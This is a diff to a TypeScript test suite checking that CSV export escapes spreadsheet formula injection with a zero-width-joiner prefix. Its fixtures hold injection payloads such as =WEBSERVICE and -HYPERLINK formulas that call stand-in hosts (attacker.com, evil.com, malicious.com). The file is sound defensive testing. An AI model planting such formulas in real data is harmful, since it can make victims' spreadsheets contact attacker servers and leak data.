@@ -1,6 +1,6 @@
 import { type FieldMetadata } from '@/object-record/record-field/ui/types/FieldMetadata';
 import { type ColumnDefinition } from '@/object-record/record-table/types/ColumnDefinition';
-import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/utils/csvSecurity';
+import { CSV_INJECTION_PREVENTION_ZWJ } from '@/spreadsheet-import/constants/CsvInjectionPreventionZwj';
 
 import { FieldMetadataType, RelationType } from '~/generated-metadata/graphql';
 import {
@@ -68,15 +68,12 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // The malicious formula should be prefixed with ZWJ (preserving original content)
       expect(csv).toContain(
         `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")`,
       );
-      // Should not contain the raw dangerous formula
       expect(csv).not.toContain(
         '1,Test User,=WEBSERVICE("http://attacker.com")',
       );
-      // Should contain the ZWJ-prefixed version in CSV format
       expect(csv).toContain(
         `1,Test User,"${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://attacker.com"")"`,
       );
@@ -96,9 +93,7 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // Should preserve the original content with ZWJ prefix
       expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}+1+1`);
-      // Should not contain the raw dangerous formula
       expect(csv).not.toContain('1,+1+1');
     });
 
@@ -116,9 +111,7 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // Should preserve the original content with ZWJ prefix
       expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}-1+1`);
-      // Should not contain the raw dangerous formula
       expect(csv).not.toContain('1,-1+1');
     });
 
@@ -136,9 +129,7 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // Should preserve the original content with ZWJ prefix
       expect(csv).toContain(`${CSV_INJECTION_PREVENTION_ZWJ}@SUM(1,1)`);
-      // Should not contain the raw dangerous formula
       expect(csv).not.toContain('1,@SUM(1,1)');
     });
 
@@ -156,11 +147,9 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // Should preserve the original content with ZWJ prefix (accounting for CSV escaping)
       expect(csv).toContain(
         `${CSV_INJECTION_PREVENTION_ZWJ}\t=WEBSERVICE(""http://attacker.com"")`,
       );
-      // Should not contain the raw dangerous formula
       expect(csv).not.toContain('1,\t=WEBSERVICE("http://attacker.com")');
     });
 
@@ -178,11 +167,9 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // Should preserve the original content with ZWJ prefix (accounting for CSV escaping)
       expect(csv).toContain(
         `${CSV_INJECTION_PREVENTION_ZWJ}\r=WEBSERVICE(""http://attacker.com"")`,
       );
-      // Should not contain the raw dangerous formula
       expect(csv).not.toContain('1,\r=WEBSERVICE("http://attacker.com")');
     });
 
@@ -204,7 +191,6 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // All dangerous values should be preserved with ZWJ prefix (accounting for CSV escaping)
       expect(csv).toContain(
         `${CSV_INJECTION_PREVENTION_ZWJ}=WEBSERVICE(""http://evil.com"")`,
       );
@@ -213,7 +199,6 @@ describe('generateCsv', () => {
         `${CSV_INJECTION_PREVENTION_ZWJ}-HYPERLINK(""http://malicious.com"")`,
       );
 
-      // Original dangerous payloads should not be present without ZWJ prefix
       expect(csv).not.toContain('1,=WEBSERVICE("http://evil.com")');
       expect(csv).not.toContain(',+SUM(A1:A10)');
       expect(csv).not.toContain(',-HYPERLINK("http://malicious.com")');
@@ -238,7 +223,6 @@ describe('generateCsv', () => {
 
       const csv = generateCsv({ columns, rows });
 
-      // Legitimate content should be preserved
       expect(csv).toContain('John Doe');
       expect(csv).toContain('john@example.com');
       expect(csv).toContain(
